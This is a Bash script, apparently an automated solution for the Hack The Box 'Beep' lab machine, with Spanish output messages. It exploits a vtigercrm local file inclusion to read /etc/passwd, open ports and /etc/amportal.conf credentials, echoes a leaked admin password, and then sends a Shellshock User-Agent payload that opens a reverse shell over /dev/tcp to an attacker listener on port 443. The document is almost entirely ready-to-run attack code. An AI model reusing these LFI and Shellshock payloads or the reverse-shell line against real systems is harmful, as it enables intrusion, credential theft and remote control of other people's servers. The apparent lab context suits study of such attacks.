#!/bin/bash

#Tabla de colores:

declare -r greenColour="\e[0;32m\033[1m"
declare -r endColour="\033[0m\e[0m"
declare -r redColour="\e[0;31m\033[1m"
declare -r blueColour="\e[0;34m\033[1m"
declare -r yellowColour="\e[0;33m\033[1m"
declare -r purpleColour="\e[0;35m\033[1m"
declare -r turquoiseColour="\e[0;36m\033[1m"
declare -r grayColour="\e[0;37m\033[1m"

#Ctrl + C

trap ctrl_c INT

function ctrl_c (){
	rm tcp.txt 2>/dev/null
	rm puertoshex.txt 2>/dev/null
        echo -e "\n\n${redColour}[!] ${endColour}¡Cerrando el programa..!\n"
        sleep 1
        exit 1
}


echo -e "${greenColour}[+] ${endColour}Bienvenido a AutoHackBeep. Iniciando el escaneo...\n"
echo -e "${greenColour}[+] ${endColour}Sitio web encontrado: `whatweb https://10.10.10.7/ 2>/dev/null`"
sleep 3

echo ""

echo -e "${redColour}[!] ${endColour}Vulnerabilidad encontrada: ${yellowColour}LFI${endColour}"
sleep 2
echo -e "${redColour}[!] ${endColour}Explotando distintos vectores de ataque...\n"
sleep 1

#Usuarios
curl -s -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action" > users.txt && echo -e "${turquoiseColour}[*] ${endColour}Usuarios:\n"
cat users.txt | sed '$ d'
sleep 3
echo ""

#Puertos abiertos
curl -s -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//proc/net/tcp%00&module=Accounts&action" > tcp.txt && echo -e "${turquoiseColour}[*] ${endColour}Puertos abiertos de manera local:\n"
cat tcp.txt | cut -d ":" -f3 | sed '$ d' | sed '1d' | cut -d " " -f1 | sort -u > puertoshex.txt
for i in $(cat puertoshex.txt); do echo "[+] Puerto: $(echo "obase=10; ibase=16; $i" | bc) -- ABIERTO"; done
sleep 3
echo ""

#Credenciales
curl -s -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" > credenciales.txt && echo -e "${turquoiseColour}[*] ${endColour}Credenciales encontradas:" 
head -n 40 credenciales.txt | tail -n 22
sleep 3
echo -e "${turquoiseColour}[+] ${endColour}Ingresando con las credenciales obtenidas...\n"

echo -e "${turquoiseColour}AMPMGRUSER=admin${endColour}"
echo -e "${turquoiseColour}AMPMGRPASS=jEhdIekWmdjE${endColour}\n"
sleep 5

#Login
echo -e "${redColour}[!] ${endColour}Fue imposible ingresar con esas credenciales..\n"

#LoginPort10000
echo -e "${greenColour}[+] ${endColour}Continuando el escaneo..."
echo -e "${greenColour}[+] ${endColour}Sitio web encontrado: `whatweb https://10.10.10.7:10000/ 2>/dev/null`"
sleep 3
echo -e 
echo -e "${greenColour}[+] ${endColour}Ingresando con las credenciales al puerto 10000\n"
sleep 2
echo -e "${redColour}[!] ${endColour}Login fallido!"
sleep 2
echo -e "${greenColour}[*] ${endColour}Cambiando al usuario root...\n"
sleep 2
echo -e "${turquoiseColour}[+] ${endColour}Login valido!\n"
echo -e "${redColour}[*] Activando REVERSE SHELL...${endColour}"

x-terminal-emulator -e nc -lvp 443 > /dev/null 2>&1 &
disown -a
curl -H "User-Agent: () { :; }; bash -i >& /dev/tcp/10.10.14.30/443 0>&1" -k https://10.10.10.7:10000/session_login.cgi > /dev/null 2>/dev/null

#Borrado de archivos
rm puertoshex.txt 2>/dev/null
rm tcp.txt 2>/dev/null
